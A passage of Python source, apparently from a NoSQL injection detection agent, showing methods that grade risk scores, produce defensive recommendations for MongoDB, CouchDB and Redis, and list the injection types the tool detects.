                "injection_points_found": len(results["injection_points"]),
                "risk_score": risk_score,
                "risk_level": self._calculate_risk_level(risk_score)
            }
            
            results["recommendations"] = self._generate_nosql_recommendations(results)
            
            return results
        
        except Exception as e:
            self.logger.error(f"NoSQL results analysis failed: {e}")
            return results
    
    def _calculate_risk_level(self, risk_score: int) -> str:
        """Calculate risk level based on score"""
        if risk_score >= 12:
            return "CRITICAL"
        elif risk_score >= 8:
            return "HIGH"
        elif risk_score >= 4:
            return "MEDIUM"
        else:
            return "LOW"
    
    def _generate_nosql_recommendations(self, results: Dict[str, Any]) -> List[str]:
        """Generate NoSQL-specific security recommendations"""
        recommendations = []
        
        if results["statistics"]["total_vulnerabilities"] > 0:
            recommendations.extend([
                "CRITICAL: Implement proper input validation and sanitization",
                "Use parameterized queries and avoid dynamic query construction",
                "Implement query allowlisting for NoSQL operations",
                "Validate and sanitize all user input before database queries",
                "Use principle of least privilege for database access"
            ])
        
        # Database-specific recommendations
        db_vulns = results.get("vulnerabilities_by_database", {})
        
        if "MongoDB" in db_vulns:
            recommendations.extend([
                "MongoDB: Disable JavaScript execution ($where operator) if not needed",
                "MongoDB: Use MongoDB's built-in validation and schema enforcement",
                "MongoDB: Implement proper authentication and role-based access control",
                "MongoDB: Avoid using eval() or $where with user input"
            ])
        
        if "CouchDB" in db_vulns:
            recommendations.extend([
                "CouchDB: Validate view parameters and selector queries",
                "CouchDB: Implement proper authentication for database access",
                "CouchDB: Use design document validation functions"
            ])
        
        if "Redis" in db_vulns:
            recommendations.extend([
                "Redis: Disable dangerous commands (EVAL, SCRIPT, etc.) if not needed",
                "Redis: Use Redis ACL for command and key access control",
                "Redis: Validate key patterns and commands"
            ])
        
        # Injection type specific recommendations
        injection_types = results.get("vulnerabilities_by_injection_type", {})
        
        if "JavaScript Injection" in injection_types:
            recommendations.append("Disable JavaScript execution in NoSQL queries")
        
        if "Aggregation Injection" in injection_types:
            recommendations.append("Validate and sanitize aggregation pipeline stages")
        
        if "Blind Injection" in injection_types:
            recommendations.append("Implement query timeouts and monitoring")
        
        recommendations.extend([
            "Implement comprehensive logging of database queries",
            "Use database activity monitoring tools",
            "Regular security audits of NoSQL query construction",
            "Implement rate limiting for database operations",
            "Use NoSQL injection detection tools in CI/CD pipelines"
        ])
        
        return recommendations
    
    def get_vulnerability_types(self) -> List[str]:
        """Get types of NoSQL vulnerabilities this agent can detect"""
        return [
            "MongoDB Injection",
            "CouchDB Injection", 
            "Redis Injection",
            "Cassandra CQL Injection",
            "NoSQL Tautology Attack",
            "NoSQL JavaScript Injection",
            "NoSQL Aggregation Pipeline Injection",
            "NoSQL Boolean-based Blind Injection",
            "NoSQL Time-based Blind Injection",
            "NoSQL Array Injection",
            "NoSQL Regex Injection"
        ]
    
    def get_description(self) -> str:
        """Get agent description"""
        return "Advanced NoSQL injection detection agent supporting MongoDB, CouchDB, Redis, Cassandra and other NoSQL databases with advanced attack techniques"

